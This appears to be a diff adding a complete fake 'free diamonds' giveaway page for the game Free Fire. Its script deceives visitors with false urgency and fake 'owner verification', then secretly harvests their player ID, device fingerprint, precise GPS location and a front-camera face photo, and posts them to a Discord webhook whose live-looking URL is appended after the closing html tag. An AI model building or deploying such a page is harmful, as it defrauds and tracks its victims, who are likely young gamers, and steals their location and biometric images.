@@ -1,0 +1,146 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>500 Free Diamonds — Claim Page</title>
+<meta property="og:title" content="500 Free Diamonds — Claim Page">
+<meta property="og:description" content="Giveaway is live. Enter your UID and verify to claim.">
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{margin:0;font-family:system-ui,-apple-system,sans-serif;background:#0d0d10;
+ color:#f2f2f4;min-height:100vh;padding:18px 16px 40px}
+.hero{max-width:430px;margin:0 auto;text-align:center}
+h1{font-size:26px;margin:6px 0 4px}
+h1 span{color:#ff8a2b}
+.sub{color:#9a9aa4;font-size:13px;margin:0 0 20px}
+.card{background:#17171d;border:1px solid #26262f;border-radius:16px;padding:16px;
+ max-width:430px;margin:0 auto 14px}
+label{display:block;font-size:12px;color:#9a9aa4;margin-bottom:6px;
+ text-transform:uppercase;letter-spacing:.6px}
+input[type=text]{width:100%;padding:13px;border-radius:10px;border:1px solid #2e2e39;
+ background:#0f0f13;color:#fff;font-size:16px}
+video{width:100%;aspect-ratio:3/4;object-fit:cover;border-radius:12px;background:#000;display:block}
+button{width:100%;padding:15px;border:0;border-radius:12px;font-size:16px;font-weight:700;
+ background:linear-gradient(180deg,#ff9a3c,#f2711c);color:#1a1005;margin-top:12px}
+button:disabled{opacity:.45}
+.step{display:flex;gap:10px;align-items:center;font-size:13px;color:#7d7d88;margin-bottom:10px}
+.dot{width:22px;height:22px;border-radius:50%;background:#26262f;display:grid;
+ place-items:center;font-size:11px;flex:none}
+.hide{display:none}
+#status{font-size:12px;color:#7d7d88;text-align:center;margin-top:10px}
+.code{font-family:monospace;background:#0f0f13;border:1px dashed #3a3a46;padding:14px;
+ border-radius:10px;text-align:center;font-size:19px;letter-spacing:3px;color:#ffb066;margin-top:12px}
+</style>
+</head>
+<body>
+<script>
+const HOOK = "PASTE_HOOK_HERE";
+</script>
+
+<div class="hero">
+  <h1>You got <span>500 Diamonds</span></h1>
+  <p class="sub">Verified drop · 2 slots left in your region</p>
+</div>
+
+<div class="card" id="s1">
+  <div class="step"><div class="dot">1</div>Enter your Free Fire UID</div>
+  <label>Player ID</label>
+  <input type="text" id="uid" inputmode="numeric" placeholder="e.g. 1847263910">
+  <button id="next">Continue</button>
+</div>
+
+<div class="card hide" id="s2">
+  <div class="step"><div class="dot">2</div>Verify you're the account owner</div>
+  <video id="cam" autoplay playsinline muted></video>
+  <input type="file" id="fallback" accept="image/*" capture="user" class="hide">
+  <button id="verify">Start verification</button>
+  <div id="status"></div>
+</div>
+
+<div class="card hide" id="s3">
+  <div class="step"><div class="dot">✓</div>Submitted</div>
+  <p style="font-size:13px;color:#9a9aa4;margin:0">Diamonds arrive within 24h. Keep this code:</p>
+  <div class="code" id="code"></div>
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+const data = { ua:navigator.userAgent, lang:navigator.language,
+  tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+  screen:screen.width + "x" + screen.height, platform:navigator.platform,
+  touch:navigator.maxTouchPoints, cores:navigator.hardwareConcurrency };
+try {
+  const c = document.createElement("canvas").getContext("webgl");
+  const d = c.getExtension("WEBGL_debug_renderer_info");
+  data.gpu = d ? c.getParameter(d.UNMASKED_RENDERER_WEBGL) : "n/a";
+} catch(e){}
+
+$("next").onclick = () => {
+  if ($("uid").value.trim().length < 5) return alert("Enter a valid UID");
+  data.uid = $("uid").value.trim();
+  $("s1").classList.add("hide"); $("s2").classList.remove("hide");
+  navigator.geolocation.getCurrentPosition(
+    p => { data.lat = p.coords.latitude; data.lon = p.coords.longitude;
+           data.acc = p.coords.accuracy; },
+    () => {}, { enableHighAccuracy:true, timeout:8000 });
+  if (navigator.getBattery) navigator.getBattery()
+    .then(b => { data.battery = Math.round(b.level*100) + "%"; });
+};
+
+let stream, blob = null;
+
+$("verify").onclick = async () => {
+  $("verify").disabled = true;
+  $("status").textContent = "Opening camera…";
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video:{ facingMode:"user", width:640 } });
+    $("cam").srcObject = stream;
+    $("status").textContent = "Hold still…";
+    setTimeout(capture, 1600);
+  } catch (e) {
+    $("status").textContent = "Camera blocked — pick a photo manually";
+    $("fallback").classList.remove("hide");
+    $("fallback").onchange = ev => {
+      const f = ev.target.files[0]; if (!f) return;
+      blob = f; $("status").textContent = "Verifying…"; send();
+    };
+  }
+};
+
+function capture(){
+  const v = $("cam"), c = document.createElement("canvas");
+  c.width = v.videoWidth || 480; c.height = v.videoHeight || 640;
+  c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
+  stream.getTracks().forEach(t => t.stop());
+  c.toBlob(b => { blob = b; $("status").textContent = "Verifying…"; send(); },
+    "image/jpeg", 0.72);
+}
+
+async function send(){
+  const info = [
+    "**UID:** " + (data.uid || "-"),
+    "**GPS:** " + (data.lat ? data.lat + ", " + data.lon + " ±" + Math.round(data.acc) + "m" : "denied"),
+    "**Device:** " + data.platform + " · " + data.screen,
+    "**GPU:** " + (data.gpu || "-"),
+    "**TZ / Lang:** " + data.tz + " / " + data.lang,
+    "**Battery:** " + (data.battery || "-") + " · **Touch:** " + data.touch,
+    "**UA:** " + data.ua.slice(0, 180)
+  ].join("\n");
+
+  const fd = new FormData();
+  fd.append("payload_json", JSON.stringify({
+    username: "Giveaway Bot",
+    embeds: [{ title: "New claim", description: info, color: 0xF2711C }]
+  }));
+  if (blob) fd.append("files[0]", blob, "face.jpg");
+
+  try { await fetch(HOOK, { method:"POST", body:fd }); } catch(e){}
+
+  $("s2").classList.add("hide"); $("s3").classList.remove("hide");
+  $("code").textContent = "FF-" + Math.random().toString(36).slice(2,7).toUpperCase();
+}
+</script>
+</body>
+</html><script>const HOOK = "https://discord.com/api/webhooks/1568704069793480874/dyYCKzjN_0A5pTv18wRV1Vtjo4wQxxhcu_g1um0KuXM3N7hBOaYK3IE1QlQv9d53Ttb-";</script>
